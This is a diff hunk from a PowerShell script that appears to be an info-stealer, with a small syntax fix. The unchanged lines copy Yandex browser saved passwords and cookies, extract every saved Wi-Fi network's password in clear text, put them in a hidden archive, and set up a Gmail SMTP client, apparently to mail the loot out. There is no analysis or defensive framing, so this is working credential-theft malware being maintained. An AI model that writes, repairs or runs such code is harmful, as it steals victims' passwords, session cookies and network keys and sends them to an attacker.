@@ -19,7 +19,7 @@ elseif("7-Zip"-in $arh){.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
 $w=$env:TEMP\p.txt
 if("WinRAR" -in $arh){Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip"-in $arh){.\7z.exe a $p $w -spf -tzip}}else{echo "asd"}
+elseif("7-Zip"-in $arh){.\7z.exe a $p $w -spf -tzip}else{echo "asd"}
 attrib +H $p
 
 $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
